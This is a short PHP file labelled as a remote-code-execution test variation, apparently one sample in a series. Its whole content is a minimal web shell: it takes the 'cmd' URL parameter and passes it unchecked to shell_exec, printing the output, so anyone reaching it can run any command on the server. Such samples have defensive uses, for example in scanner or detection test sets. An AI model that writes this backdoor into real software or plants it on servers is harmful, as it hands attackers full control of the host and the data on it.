<?php
// RCE test variation #39
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>